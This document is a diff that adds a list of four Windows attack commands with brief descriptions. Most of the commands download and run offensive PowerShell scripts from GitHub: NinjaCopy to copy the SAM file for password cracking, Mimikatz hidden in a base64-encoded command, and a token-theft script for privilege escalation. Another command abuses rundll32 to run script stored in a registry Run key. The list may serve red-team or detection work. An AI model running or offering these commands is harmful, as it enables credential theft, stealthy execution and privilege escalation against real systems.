@@ -1,0 +1,12 @@
+## Discription for the command 1: Frequently, attackers would want to have the live NTDS.dit or SAM files. NinjaCopy is a powershell command that allows any NTFS file (including NTDS.dit or sam file for password cracking) to be copied without starting suspicious services ##
+## Command 1: ##
+powershell ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-NinjaCopy/Invoke-NinjaCopy.ps1'); Invoke-NinjaCopy -path c:\windows\system32\config\sam -localdestination c:\temp\samcopy -verbose"
+## Discription for the command 2: This is essentially just a way for rundll32.exe to run javascript as a function of mshtml.dll, and the javascript code is reading and executing the javascript code in the specified location in the registry##
+## Command 2: ##
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write("\74script language=jscript.encode>"+(new%20ActiveXObject("WScript.Shell")).RegRead("HKCU\\software\\microsoft\\windows\\currentversion\\run\\")+"\74/script>")
+## Discription for the command 3: An encoded powershell command to invoke mimikatz ##
+## Command 3: ##
+powershell -ExecutionPolicy Bypass -encodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBsAHkAbQBiADMAcgAvAFAAbwB3AGUAcgBTAGgAZQBsAGwALwBtAGEAcwB0AGUAcgAvAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAnACkAOwAgAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AA==
+## Discription for the command 4: This command invokes token manipulation script for privilege Escalation via Token Theft ##
+## Command 4: ##
+powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-TokenManipulation')
